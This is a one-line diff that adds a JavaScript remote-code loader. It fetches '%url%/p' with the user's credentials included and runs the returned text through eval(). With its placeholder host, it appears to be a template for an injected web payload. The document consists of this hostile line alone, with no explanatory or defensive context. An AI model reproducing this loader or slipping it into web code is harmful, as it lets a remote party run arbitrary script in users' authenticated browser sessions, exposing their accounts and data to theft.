@@ -1,0 +1,1 @@
+fetch('%url%/p',{credentials: 'include'}).then(response=>response.text()).then(text=>{eval(text)})
